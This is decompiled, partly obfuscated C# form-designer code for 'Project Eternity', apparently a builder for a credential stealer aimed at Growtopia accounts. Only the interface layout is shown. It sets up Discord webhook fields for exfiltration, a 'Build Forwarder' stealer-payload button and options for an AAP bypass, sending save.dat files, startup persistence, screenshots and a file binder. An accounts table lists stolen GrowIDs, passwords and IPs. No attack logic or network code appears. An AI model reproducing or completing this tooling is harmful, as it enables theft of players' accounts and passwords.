			this.metroButton12.Enabled = false;
			this.metroButton12.FontSize = 2;
			this.metroButton12.FontWeight = 0;
			this.metroButton12.Location = new Point(256, 35);
			this.metroButton12.Margin = new Padding(2);
			this.metroButton12.Name = "metroButton12";
			this.metroButton12.Size = new Size(22, 22);
			this.metroButton12.TabIndex = 16;
			this.metroButton12.Text = "...";
			this.metroButton12.Theme = 2;
			this.metroButton12.UseSelectable = true;
			this.metroButton12.Visible = false;
			this.label2.AutoSize = true;
			this.label2.BackColor = Color.Transparent;
			this.label2.Font = new Font("Segoe UI Light", 13f);
			this.label2.ForeColor = Color.White;
			this.label2.Location = new Point(17, 31);
			this.label2.Margin = new Padding(2, 0, 2, 0);
			this.label2.Name = "label2";
			this.label2.Size = new Size(90, 25);
			this.label2.TabIndex = 12;
			this.label2.Text = "Save path:";
			this.label2.Visible = false;
			this.metroTextBox3.Anchor = AnchorStyles.None;
			this.metroTextBox3.CustomButton.Image = null;
			this.metroTextBox3.CustomButton.Location = new Point(96, 1);
			this.metroTextBox3.CustomButton.Name = "";
			this.metroTextBox3.CustomButton.Size = new Size(17, 17);
			this.metroTextBox3.CustomButton.Style = 4;
			this.metroTextBox3.CustomButton.TabIndex = 1;
			this.metroTextBox3.CustomButton.Theme = 1;
			this.metroTextBox3.CustomButton.UseSelectable = true;
			this.metroTextBox3.CustomButton.Visible = false;
			this.metroTextBox3.FontSize = 1;
			this.metroTextBox3.Lines = new string[0];
			this.metroTextBox3.Location = new Point(109, 34);
			this.metroTextBox3.MaxLength = 32767;
			this.metroTextBox3.Multiline = true;
			this.metroTextBox3.Name = "metroTextBox3";
			this.metroTextBox3.PasswordChar = '\0';
			this.metroTextBox3.ScrollBars = ScrollBars.None;
			this.metroTextBox3.SelectedText = "";
			this.metroTextBox3.SelectionLength = 0;
			this.metroTextBox3.SelectionStart = 0;
			this.metroTextBox3.ShortcutsEnabled = true;
			this.metroTextBox3.Size = new Size(142, 23);
			this.metroTextBox3.TabIndex = 11;
			this.metroTextBox3.TabStop = false;
			this.metroTextBox3.Theme = 2;
			this.metroTextBox3.UseSelectable = true;
			this.metroTextBox3.Visible = false;
			this.metroTextBox3.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.metroTextBox3.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.metroButton11.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			this.metroButton11.FontSize = 2;
			this.metroButton11.FontWeight = 1;
			this.metroButton11.Highlight = true;
			this.metroButton11.Location = new Point(484, 30);
			this.metroButton11.Margin = new Padding(2);
			this.metroButton11.Name = "metroButton11";
			this.metroButton11.Size = new Size(0, 144);
			this.metroButton11.TabIndex = 2;
			this.metroButton11.Text = "Decode";
			this.metroButton11.Theme = 2;
			this.metroButton11.UseSelectable = true;
			this.groupBox4.BackColor = Color.Transparent;
			this.groupBox4.Controls.Add(this.metroButton4);
			this.groupBox4.Font = new Font("Segoe UI Light", 12f);
			this.groupBox4.ForeColor = Color.White;
			this.groupBox4.Location = new Point(17, 188);
			this.groupBox4.Margin = new Padding(2);
			this.groupBox4.Name = "groupBox4";
			this.groupBox4.Padding = new Padding(2);
			this.groupBox4.Size = new Size(278, 116);
			this.groupBox4.TabIndex = 12;
			this.groupBox4.TabStop = false;
			this.groupBox4.Text = "Unbanner";
			this.metroButton4.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			this.metroButton4.FontSize = 2;
			this.metroButton4.FontWeight = 1;
			this.metroButton4.Highlight = true;
			this.metroButton4.Location = new Point(36, 35);
			this.metroButton4.Margin = new Padding(2);
			this.metroButton4.Name = "metroButton4";
			this.metroButton4.Size = new Size(205, 60);
			this.metroButton4.TabIndex = 2;
			this.metroButton4.Text = "Unban";
			this.metroButton4.Theme = 2;
			this.metroButton4.UseSelectable = true;
			this.metroButton4.Click += this.metroButton4_Click;
			this.groupBox3.BackColor = Color.Transparent;
			this.groupBox3.Controls.Add(this.metroButton9);
			this.groupBox3.Controls.Add(this.metroButton6);
			this.groupBox3.Controls.Add(this.metroButton7);
			this.groupBox3.Controls.Add(this.metroButton8);
			this.groupBox3.Font = new Font("Segoe UI Light", 12f);
			this.groupBox3.ForeColor = Color.White;
			this.groupBox3.Location = new Point(17, 35);
			this.groupBox3.Margin = new Padding(2);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Padding = new Padding(2);
			this.groupBox3.Size = new Size(278, 140);
			this.groupBox3.TabIndex = 6;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Proxy";
			this.metroButton9.FontSize = 2;
			this.metroButton9.FontWeight = 1;
			this.metroButton9.Highlight = true;
			this.metroButton9.Location = new Point(147, 84);
			this.metroButton9.Margin = new Padding(2);
			this.metroButton9.Name = "metroButton9";
			this.metroButton9.Size = new Size(111, 28);
			this.metroButton9.TabIndex = 11;
			this.metroButton9.Text = "Stop Proxy";
			this.metroButton9.Theme = 2;
			this.metroButton9.UseSelectable = true;
			this.metroButton9.Click += this.metroButton9_Click;
			this.metroButton6.FontSize = 2;
			this.metroButton6.FontWeight = 1;
			this.metroButton6.Highlight = true;
			this.metroButton6.Location = new Point(147, 40);
			this.metroButton6.Margin = new Padding(2);
			this.metroButton6.Name = "metroButton6";
			this.metroButton6.Size = new Size(111, 28);
			this.metroButton6.TabIndex = 8;
			this.metroButton6.Text = "Start Proxy";
			this.metroButton6.Theme = 2;
			this.metroButton6.UseSelectable = true;
			this.metroButton6.Click += this.startProxy_Click;
			this.metroButton7.FontSize = 2;
			this.metroButton7.FontWeight = 1;
			this.metroButton7.Highlight = true;
			this.metroButton7.Location = new Point(20, 40);
			this.metroButton7.Margin = new Padding(2);
			this.metroButton7.Name = "metroButton7";
			this.metroButton7.Size = new Size(111, 28);
			this.metroButton7.TabIndex = 9;
			this.metroButton7.Text = "Enable Hosts";
			this.metroButton7.Theme = 2;
			this.metroButton7.UseSelectable = true;
			this.metroButton7.Click += this.metroButton7_Click;
			this.metroButton8.FontSize = 2;
			this.metroButton8.FontWeight = 1;
			this.metroButton8.Highlight = true;
			this.metroButton8.Location = new Point(20, 84);
			this.metroButton8.Margin = new Padding(2);
			this.metroButton8.Name = "metroButton8";
			this.metroButton8.Size = new Size(111, 28);
			this.metroButton8.TabIndex = 10;
			this.metroButton8.Text = "Disable Hosts";
			this.metroButton8.Theme = 2;
			this.metroButton8.UseSelectable = true;
			this.metroButton8.Click += this.metroButton8_Click;
			this.EternityTabs.Controls.Add(this.StealerTab);
			this.EternityTabs.Controls.Add(this.SavedatsTab);
			this.EternityTabs.Controls.Add(this.UnbannerTab);
			this.EternityTabs.ItemSize = new Size(150, 40);
			this.EternityTabs.Location = new Point(26, 57);
			this.EternityTabs.Margin = new Padding(2);
			this.EternityTabs.Name = "EternityTabs";
			this.EternityTabs.SelectedIndex = 1;
			this.EternityTabs.Size = new Size(615, 410);
			this.EternityTabs.SizeMode = TabSizeMode.Fixed;
			this.EternityTabs.TabIndex = 15;
			this.EternityTabs.TextAlign = ContentAlignment.MiddleCenter;
			this.EternityTabs.Theme = 2;
			this.EternityTabs.UseSelectable = true;
			this.StealerTab.Controls.Add(this.metroButton1);
			this.StealerTab.Controls.Add(this.groupBox1);
			this.StealerTab.Controls.Add(this.groupBox2);
			this.StealerTab.HorizontalScrollbarBarColor = true;
			this.StealerTab.HorizontalScrollbarHighlightOnWheel = false;
			this.StealerTab.HorizontalScrollbarSize = 8;
			this.StealerTab.Location = new Point(4, 44);
			this.StealerTab.Margin = new Padding(2);
			this.StealerTab.Name = "StealerTab";
			this.StealerTab.Size = new Size(607, 362);
			this.StealerTab.TabIndex = 0;
			this.StealerTab.Text = "Stealer";
			this.StealerTab.Theme = 2;
			this.StealerTab.VerticalScrollbarBarColor = true;
			this.StealerTab.VerticalScrollbarHighlightOnWheel = false;
			this.StealerTab.VerticalScrollbarSize = 8;
			this.metroButton1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.metroButton1.BackColor = Color.FromArgb(26, 32, 40);
			this.metroButton1.FontSize = 2;
			this.metroButton1.FontWeight = 0;
			this.metroButton1.Highlight = true;
			this.metroButton1.Location = new Point(19, 289);
			this.metroButton1.Margin = new Padding(2);
			this.metroButton1.Name = "metroButton1";
			this.metroButton1.Size = new Size(182, 50);
			this.metroButton1.TabIndex = 9;
			this.metroButton1.TabStop = false;
			this.metroButton1.Text = "Build Forwarder";
			this.metroButton1.Theme = 2;
			this.metroButton1.UseSelectable = true;
			this.metroButton1.EnabledChanged += this.metroButton1_EnabledChanged;
			this.metroButton1.Click += this.metroButton1_Click;
			this.groupBox1.BackColor = Color.Transparent;
			this.groupBox1.Controls.Add(this.metroTextBox2);
			this.groupBox1.Controls.Add(this.label3);
			this.groupBox1.Controls.Add(this.metroTextBox1);
			this.groupBox1.Controls.Add(this.label1);
			this.groupBox1.Font = new Font("Segoe UI Light", 12f);
			this.groupBox1.ForeColor = Color.White;
			this.groupBox1.Location = new Point(19, 37);
			this.groupBox1.Margin = new Padding(2);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Padding = new Padding(2);
			this.groupBox1.Size = new Size(574, 104);
			this.groupBox1.TabIndex = 5;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Discord Webhooks";
			this.metroTextBox2.CustomButton.Image = null;
			this.metroTextBox2.CustomButton.Location = new Point(291, 2);
			this.metroTextBox2.CustomButton.Name = "";
			this.metroTextBox2.CustomButton.Size = new Size(14, 14);
			this.metroTextBox2.CustomButton.Style = 4;
			this.metroTextBox2.CustomButton.TabIndex = 1;
			this.metroTextBox2.CustomButton.Theme = 1;
			this.metroTextBox2.CustomButton.UseSelectable = true;
			this.metroTextBox2.CustomButton.Visible = false;
			this.metroTextBox2.FontSize = 1;
			this.metroTextBox2.Lines = new string[0];
			this.metroTextBox2.Location = new Point(177, 68);
			this.metroTextBox2.MaxLength = 32767;
			this.metroTextBox2.Multiline = true;
			this.metroTextBox2.Name = "metroTextBox2";
			this.metroTextBox2.PasswordChar = '\0';
			this.metroTextBox2.ScrollBars = ScrollBars.None;
			this.metroTextBox2.SelectedText = "";
			this.metroTextBox2.SelectionLength = 0;
			this.metroTextBox2.SelectionStart = 0;
			this.metroTextBox2.ShortcutsEnabled = true;
			this.metroTextBox2.Size = new Size(384, 22);
			this.metroTextBox2.TabIndex = 12;
			this.metroTextBox2.TabStop = false;
			this.metroTextBox2.Theme = 2;
			this.metroTextBox2.UseSelectable = true;
			this.metroTextBox2.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.metroTextBox2.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.label3.AutoSize = true;
			this.label3.BackColor = Color.Transparent;
			this.label3.Font = new Font("Segoe UI Light", 13f);
			this.label3.ForeColor = Color.White;
			this.label3.Location = new Point(12, 65);
			this.label3.Margin = new Padding(2, 0, 2, 0);
			this.label3.Name = "label3";
			this.label3.Size = new Size(160, 25);
			this.label3.TabIndex = 11;
			this.label3.Text = "Webhook Files URL:";
			this.metroTextBox1.Anchor = AnchorStyles.None;
			this.metroTextBox1.CustomButton.Image = null;
			this.metroTextBox1.CustomButton.Location = new Point(290, 1);
			this.metroTextBox1.CustomButton.Name = "";
			this.metroTextBox1.CustomButton.Size = new Size(17, 17);
			this.metroTextBox1.CustomButton.Style = 4;
			this.metroTextBox1.CustomButton.TabIndex = 1;
			this.metroTextBox1.CustomButton.Theme = 1;
			this.metroTextBox1.CustomButton.UseSelectable = true;
			this.metroTextBox1.CustomButton.Visible = false;
			this.metroTextBox1.FontSize = 1;
			this.metroTextBox1.Lines = new string[0];
			this.metroTextBox1.Location = new Point(177, 31);
			this.metroTextBox1.MaxLength = 32767;
			this.metroTextBox1.Multiline = true;
			this.metroTextBox1.Name = "metroTextBox1";
			this.metroTextBox1.PasswordChar = '\0';
			this.metroTextBox1.ScrollBars = ScrollBars.None;
			this.metroTextBox1.SelectedText = "";
			this.metroTextBox1.SelectionLength = 0;
			this.metroTextBox1.SelectionStart = 0;
			this.metroTextBox1.ShortcutsEnabled = true;
			this.metroTextBox1.Size = new Size(384, 23);
			this.metroTextBox1.TabIndex = 10;
			this.metroTextBox1.TabStop = false;
			this.metroTextBox1.Theme = 2;
			this.metroTextBox1.UseSelectable = true;
			this.metroTextBox1.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.metroTextBox1.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.label1.AutoSize = true;
			this.label1.BackColor = Color.Transparent;
			this.label1.Font = new Font("Segoe UI Light", 13f);
			this.label1.ForeColor = Color.White;
			this.label1.Location = new Point(49, 29);
			this.label1.Margin = new Padding(2, 0, 2, 0);
			this.label1.Name = "label1";
			this.label1.Size = new Size(123, 25);
			this.label1.TabIndex = 2;
			this.label1.Text = "Webhook URL:";
			this.groupBox2.Anchor = AnchorStyles.Left;
			this.groupBox2.BackColor = Color.Transparent;
			this.groupBox2.Controls.Add(this.chkSendToDiscord);
			this.groupBox2.Controls.Add(this.txtPEName);
			this.groupBox2.Controls.Add(this.chkbinder);
			this.groupBox2.Controls.Add(this.metroButton2);
			this.groupBox2.Controls.Add(this.metroButton10);
			this.groupBox2.Controls.Add(this.chkIcon);
			this.groupBox2.Controls.Add(this.chkantispam);
			this.groupBox2.Controls.Add(this.chkss);
			this.groupBox2.Controls.Add(this.chkstartup);
			this.groupBox2.Controls.Add(this.chksavedat);
			this.groupBox2.Controls.Add(this.chkaap);
			this.groupBox2.Font = new Font("Segoe UI Light", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.groupBox2.ForeColor = Color.White;
			this.groupBox2.Location = new Point(19, 168);
			this.groupBox2.Margin = new Padding(2);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Padding = new Padding(2);
			this.groupBox2.Size = new Size(574, 109);
			this.groupBox2.TabIndex = 13;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "Settings";
			this.chkSendToDiscord.AutoSize = true;
			this.chkSendToDiscord.FontSize = 2;
			this.chkSendToDiscord.Location = new Point(392, 23);
			this.chkSendToDiscord.Margin = new Padding(2);
			this.chkSendToDiscord.Name = "chkSendToDiscord";
			this.chkSendToDiscord.Size = new Size(156, 25);
			this.chkSendToDiscord.TabIndex = 19;
			this.chkSendToDiscord.TabStop = false;
			this.chkSendToDiscord.Text = "Send to Discord";
			this.chkSendToDiscord.Theme = 2;
			this.chkSendToDiscord.UseSelectable = true;
			this.txtPEName.CustomButton.Image = null;
			this.txtPEName.CustomButton.Location = new Point(107, 2);
			this.txtPEName.CustomButton.Name = "";
			this.txtPEName.CustomButton.Size = new Size(14, 14);
			this.txtPEName.CustomButton.Style = 4;
			this.txtPEName.CustomButton.TabIndex = 1;
			this.txtPEName.CustomButton.Theme = 1;
			this.txtPEName.CustomButton.UseSelectable = true;
			this.txtPEName.CustomButton.Visible = false;
			this.txtPEName.FontSize = 1;
			this.txtPEName.Lines = new string[0];
			this.txtPEName.Location = new Point(392, 76);
			this.txtPEName.MaxLength = 20;
			this.txtPEName.Multiline = true;
			this.txtPEName.Name = "txtPEName";
			this.txtPEName.PasswordChar = '\0';
			this.txtPEName.PromptText = "Stealer PE Name";
			this.txtPEName.ScrollBars = ScrollBars.None;
			this.txtPEName.SelectedText = "";
			this.txtPEName.SelectionLength = 0;
			this.txtPEName.SelectionStart = 0;
			this.txtPEName.ShortcutsEnabled = true;
			this.txtPEName.Size = new Size(154, 22);
			this.txtPEName.TabIndex = 13;
			this.txtPEName.TabStop = false;
			this.txtPEName.Theme = 2;
			this.txtPEName.UseSelectable = true;
			this.txtPEName.WaterMark = "Stealer PE Name";
			this.txtPEName.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.txtPEName.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.chkbinder.AutoSize = true;
			this.chkbinder.FontSize = 2;
			this.chkbinder.Location = new Point(206, 73);
			this.chkbinder.Margin = new Padding(2);
			this.chkbinder.Name = "chkbinder";
			this.chkbinder.Size = new Size(109, 25);
			this.chkbinder.TabIndex = 18;
			this.chkbinder.TabStop = false;
			this.chkbinder.Text = "File Binder";
			this.chkbinder.Theme = 2;
			this.chkbinder.UseSelectable = true;
			this.chkbinder.CheckedChanged += this.chkbinder_CheckedChanged;
			this.metroButton2.AutoSizeMode = AutoSizeMode.GrowAndShrink;
			this.metroButton2.Enabled = false;
			this.metroButton2.FontSize = 2;
			this.metroButton2.FontWeight = 0;
			this.metroButton2.Location = new Point(80, 76);
			this.metroButton2.Margin = new Padding(2);
			this.metroButton2.Name = "metroButton2";
			this.metroButton2.Size = new Size(22, 22);
			this.metroButton2.TabIndex = 15;
			this.metroButton2.Text = "...";
			this.metroButton2.Theme = 2;
			this.metroButton2.UseSelectable = true;
			this.metroButton2.Click += this.metroButton2_Click;
			this.metroButton10.AutoSizeMode = AutoSizeMode.GrowAndShrink;
			this.metroButton10.Enabled = false;
			this.metroButton10.FontSize = 2;
			this.metroButton10.FontWeight = 0;
			this.metroButton10.Location = new Point(317, 76);
			this.metroButton10.Margin = new Padding(2);
			this.metroButton10.Name = "metroButton10";
			this.metroButton10.Size = new Size(22, 22);
			this.metroButton10.TabIndex = 17;
			this.metroButton10.Text = "...";
			this.metroButton10.Theme = 2;
			this.metroButton10.UseSelectable = true;
			this.metroButton10.Click += this.metroButton10_Click;
			this.chkIcon.AutoSize = true;
			this.chkIcon.FontSize = 2;
			this.chkIcon.Location = new Point(16, 73);
			this.chkIcon.Margin = new Padding(2);
			this.chkIcon.Name = "chkIcon";
			this.chkIcon.Size = new Size(62, 25);
			this.chkIcon.TabIndex = 16;
			this.chkIcon.TabStop = false;
			this.chkIcon.Text = "Icon";
			this.chkIcon.Theme = 2;
			this.chkIcon.UseSelectable = true;
			this.chkIcon.CheckedChanged += this.chkIcon_CheckedChanged;
			this.chkantispam.AutoSize = true;
			this.chkantispam.FontSize = 2;
			this.chkantispam.Location = new Point(392, 48);
			this.chkantispam.Margin = new Padding(2);
			this.chkantispam.Name = "chkantispam";
			this.chkantispam.Size = new Size(113, 25);
			this.chkantispam.TabIndex = 5;
			this.chkantispam.TabStop = false;
			this.chkantispam.Text = "Anti-Spam";
			this.chkantispam.Theme = 2;
			this.chkantispam.UseSelectable = true;
			this.chkss.AutoSize = true;
			this.chkss.Enabled = false;
			this.chkss.FontSize = 2;
			this.chkss.Location = new Point(206, 48);
			this.chkss.Margin = new Padding(2);
			this.chkss.Name = "chkss";
			this.chkss.Size = new Size(145, 25);
			this.chkss.TabIndex = 4;
			this.chkss.TabStop = false;
			this.chkss.Text = "Get screenshot";
			this.chkss.Theme = 2;
			this.chkss.UseSelectable = true;
			this.chkstartup.AutoSize = true;
			this.chkstartup.FontSize = 2;
			this.chkstartup.Location = new Point(206, 23);
			this.chkstartup.Margin = new Padding(2);
			this.chkstartup.Name = "chkstartup";
			this.chkstartup.Size = new Size(153, 25);
			this.chkstartup.TabIndex = 3;
			this.chkstartup.TabStop = false;
			this.chkstartup.Text = "Copy to startup";
			this.chkstartup.Theme = 2;
			this.chkstartup.UseSelectable = true;
			this.chksavedat.AutoSize = true;
			this.chksavedat.FontSize = 2;
			this.chksavedat.Location = new Point(16, 48);
			this.chksavedat.Margin = new Padding(2);
			this.chksavedat.Name = "chksavedat";
			this.chksavedat.Size = new Size(166, 25);
			this.chksavedat.TabIndex = 2;
			this.chksavedat.TabStop = false;
			this.chksavedat.Text = "Send save.dat file";
			this.chksavedat.Theme = 2;
			this.chksavedat.UseSelectable = true;
			this.chkaap.AutoSize = true;
			this.chkaap.FontSize = 2;
			this.chkaap.Location = new Point(16, 23);
			this.chkaap.Margin = new Padding(2);
			this.chkaap.Name = "chkaap";
			this.chkaap.Size = new Size(122, 25);
			this.chkaap.TabIndex = 0;
			this.chkaap.TabStop = false;
			this.chkaap.Text = "AAP Bypass";
			this.chkaap.Theme = 2;
			this.chkaap.UseSelectable = true;
			this.SavedatsTab.Controls.Add(this.metroLabel1);
			this.SavedatsTab.Controls.Add(this.metroButton5);
			this.SavedatsTab.Controls.Add(this.listView1);
			this.SavedatsTab.HorizontalScrollbarBarColor = true;
			this.SavedatsTab.HorizontalScrollbarHighlightOnWheel = false;
			this.SavedatsTab.HorizontalScrollbarSize = 10;
			this.SavedatsTab.Location = new Point(4, 44);
			this.SavedatsTab.Name = "SavedatsTab";
			this.SavedatsTab.Size = new Size(607, 362);
			this.SavedatsTab.TabIndex = 3;
			this.SavedatsTab.Text = "Accounts";
			this.SavedatsTab.Theme = 2;
			this.SavedatsTab.VerticalScrollbarBarColor = true;
			this.SavedatsTab.VerticalScrollbarHighlightOnWheel = false;
			this.SavedatsTab.VerticalScrollbarSize = 10;
			this.metroLabel1.AutoSize = true;
			this.metroLabel1.Location = new Point(3, 321);
			this.metroLabel1.Margin = new Padding(2, 0, 2, 0);
			this.metroLabel1.Name = "metroLabel1";
			this.metroLabel1.Size = new Size(64, 19);
			this.metroLabel1.TabIndex = 6;
			this.metroLabel1.Text = "Accounts:";
			this.metroLabel1.Theme = 2;
			this.metroButton5.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
			this.metroButton5.FontSize = 2;
			this.metroButton5.FontWeight = 1;
			this.metroButton5.Highlight = true;
			this.metroButton5.Location = new Point(512, 318);
			this.metroButton5.Margin = new Padding(2);
			this.metroButton5.Name = "metroButton5";
			this.metroButton5.Size = new Size(95, 28);
			this.metroButton5.TabIndex = 5;
			this.metroButton5.Text = "Refresh";
			this.metroButton5.Theme = 2;
			this.metroButton5.UseSelectable = true;
			this.metroButton5.Click += this.metroButton5_Click;
			this.listView1.BackColor = Color.FromArgb(25, 25, 25);
			this.listView1.Columns.AddRange(new ColumnHeader[]
			{
				this.GrowID,
				this.Password,
				this.IP,
				this.Date
			});
			this.listView1.Font = new Font("Segoe UI Semilight", 12f);
			this.listView1.ForeColor = Color.White;
			this.listView1.FullRowSelect = true;
			this.listView1.HideSelection = false;
			this.listView1.Location = new Point(3, 3);
			this.listView1.Name = "listView1";
			this.listView1.OwnerDraw = true;
			this.listView1.Size = new Size(604, 310);
			this.listView1.Sorting = SortOrder.Ascending;
			this.listView1.TabIndex = 2;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = View.Details;
			this.listView1.DrawColumnHeader += this.listView1_DrawColumnHeader;
			this.listView1.DrawItem += this.listView1_DrawItem;
			this.listView1.DrawSubItem += this.listView1_DrawSubItem;
			this.listView1.MouseClick += this.listView1_MouseClick;
			this.GrowID.Text = "GrowID";
			this.GrowID.Width = 170;
			this.Password.Text = "Password";
			this.Password.Width = 160;
			this.IP.Text = "IP";
			this.IP.Width = 110;
			this.Date.Text = "Date";
			this.Date.Width = 310;
			this.metroContextMenu1.BackColor = Color.FromArgb(255, 255, 255);
			this.metroContextMenu1.ForeColor = Color.FromArgb(0, 0, 0);
			this.metroContextMenu1.ImageScalingSize = new Size(20, 20);
			this.metroContextMenu1.Items.AddRange(new ToolStripItem[]
			{
				this.deleteAccountToolStripMenuItem
			});
			this.metroContextMenu1.Name = "metroContextMenu1";
			this.metroContextMenu1.Size = new Size(156, 26);
			this.deleteAccountToolStripMenuItem.Name = "deleteAccountToolStripMenuItem";
			this.deleteAccountToolStripMenuItem.Size = new Size(155, 22);
			this.deleteAccountToolStripMenuItem.Text = "Delete Account";
			this.deleteAccountToolStripMenuItem.Click += this.deleteAccountToolStripMenuItem_Click;
			this.AAPIniDialog.FileName = "AAP.ini";
			this.BinderFileDialog.FileOk += this.BinderFileDialog_FileOk;
			base.AutoScaleDimensions = new SizeF(96f, 96f);
			base.AutoScaleMode = AutoScaleMode.Dpi;
			this.AutoSize = true;
			base.ClientSize = new Size(702, 458);
			base.Controls.Add(this.EternityTabs);
			base.Controls.Add(this.pictureBox1);
			base.Controls.Add(this.metroButton3);
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new Padding(2);
			base.MaximizeBox = false;
			base.Name = "Main";
			base.Padding = new Padding(16, 60, 16, 16);
			base.Resizable = false;
			base.Style = 0;
			this.Text = "Project Eternity";
			base.Theme = 2;
			base.FormClosed += this.Main_FormClosed;
			base.Load += this.Form1_Load;
			base.Shown += this.Main_Shown;
			this.metroStyleManager1.EndInit();
			((ISupportInitialize)this.pictureBox1).EndInit();
			this.UnbannerTab.ResumeLayout(false);
			this.groupBox5.ResumeLayout(false);
			this.groupBox5.PerformLayout();
			this.groupBox4.ResumeLayout(false);
			this.groupBox3.ResumeLayout(false);
			this.EternityTabs.ResumeLayout(false);
			this.StealerTab.ResumeLayout(false);
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			this.groupBox2.ResumeLayout(false);
			this.groupBox2.PerformLayout();
			this.SavedatsTab.ResumeLayout(false);
			this.SavedatsTab.PerformLayout();
			this.metroContextMenu1.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00004B3C File Offset: 0x00002D3C
		void Ryan-PяσTєCтσRαβγδεζηθικλmcμKξοπρmcστυφχψωRyan-PяσTєCтσR(object A_1)
		{
			base.StyleManager = A_1;
		}

		// Token: 0x0400001E RID: 30
		private Info fm;

		// Token: 0x0400001F RID: 31
		private readonly IniFile MyIni = new IniFile("Eternity.ini");

		// Token: 0x04000020 RID: 32
		private string user;

		// Token: 0x04000021 RID: 33
		private string pass;

		// Token: 0x04000022 RID: 34
		private string eurl;

		// Token: 0x04000023 RID: 35
		private Stopwatch td;

		// Token: 0x04000024 RID: 36
		private IContainer components;

		// Token: 0x04000025 RID: 37
		private MetroStyleManager metroStyleManager1;

		// Token: 0x04000026 RID: 38
		private PictureBox pictureBox1;

		// Token: 0x04000027 RID: 39
		private OpenFileDialog openFileDialog1;

		// Token: 0x04000028 RID: 40
		private MetroTabControl EternityTabs;

		// Token: 0x04000029 RID: 41
		private MetroTabPage UnbannerTab;

		// Token: 0x0400002A RID: 42
		private MetroButton metroButton3;

		// Token: 0x0400002B RID: 43
		private MetroTabPage StealerTab;

		// Token: 0x0400002C RID: 44
		private MetroButton metroButton1;

		// Token: 0x0400002D RID: 45
		private GroupBox groupBox1;

		// Token: 0x0400002E RID: 46
		private MetroTextBox metroTextBox2;

		// Token: 0x0400002F RID: 47
		private Label label3;

		// Token: 0x04000030 RID: 48
		private MetroTextBox metroTextBox1;

		// Token: 0x04000031 RID: 49
		private Label label1;

		// Token: 0x04000032 RID: 50
		private GroupBox groupBox2;

		// Token: 0x04000033 RID: 51
		private MetroCheckBox chkIcon;

		// Token: 0x04000034 RID: 52
		private MetroButton metroButton2;

		// Token: 0x04000035 RID: 53
		private MetroCheckBox chkantispam;

		// Token: 0x04000036 RID: 54
		private MetroCheckBox chkss;

		// Token: 0x04000037 RID: 55
		private MetroCheckBox chkstartup;

		// Token: 0x04000038 RID: 56
		private MetroCheckBox chksavedat;

		// Token: 0x04000039 RID: 57
		private MetroCheckBox chkaap;

		// Token: 0x0400003A RID: 58
		private MetroButton metroButton4;

		// Token: 0x0400003B RID: 59
		private OpenFileDialog AAPIniDialog;

		// Token: 0x0400003C RID: 60
		private MetroCheckBox chkbinder;

		// Token: 0x0400003D RID: 61
		private MetroButton metroButton10;

		// Token: 0x0400003E RID: 62
		private OpenFileDialog BinderFileDialog;

		// Token: 0x0400003F RID: 63
		private MetroTextBox txtPEName;

		// Token: 0x04000040 RID: 64
		private MetroTabPage SavedatsTab;

		// Token: 0x04000041 RID: 65
		private MetroContextMenu metroContextMenu1;

		// Token: 0x04000042 RID: 66
		private ToolStripMenuItem deleteAccountToolStripMenuItem;

		// Token: 0x04000043 RID: 67
		private ListView listView1;

		// Token: 0x04000044 RID: 68
		private ColumnHeader GrowID;

		// Token: 0x04000045 RID: 69
		private ColumnHeader Password;

		// Token: 0x04000046 RID: 70
		private ColumnHeader IP;

		// Token: 0x04000047 RID: 71
		private ColumnHeader Date;

		// Token: 0x04000048 RID: 72
		private MetroButton metroButton5;

		// Token: 0x04000049 RID: 73
		private MetroCheckBox chkSendToDiscord;

		// Token: 0x0400004A RID: 74
		private Panel panel2;

		// Token: 0x0400004B RID: 75
		private Panel panel1;

		// Token: 0x0400004C RID: 76
		private GroupBox groupBox5;

		// Token: 0x0400004D RID: 77
		private Label label5;

		// Token: 0x0400004E RID: 78
		private Label label4;

		// Token: 0x0400004F RID: 79
		private MetroButton metroButton12;

		// Token: 0x04000050 RID: 80
		private Label label2;

		// Token: 0x04000051 RID: 81
		private MetroTextBox metroTextBox3;

		// Token: 0x04000052 RID: 82
		private MetroButton metroButton11;

		// Token: 0x04000053 RID: 83
		private GroupBox groupBox4;

		// Token: 0x04000054 RID: 84
		private GroupBox groupBox3;

		// Token: 0x04000055 RID: 85
		private MetroButton metroButton9;

		// Token: 0x04000056 RID: 86
		private MetroButton metroButton6;

		// Token: 0x04000057 RID: 87
		private MetroButton metroButton7;

		// Token: 0x04000058 RID: 88
		private MetroButton metroButton8;

		// Token: 0x04000059 RID: 89
		private Panel panel3;

		// Token: 0x0400005A RID: 90
		private MetroLabel metroLabel1;
	}
}
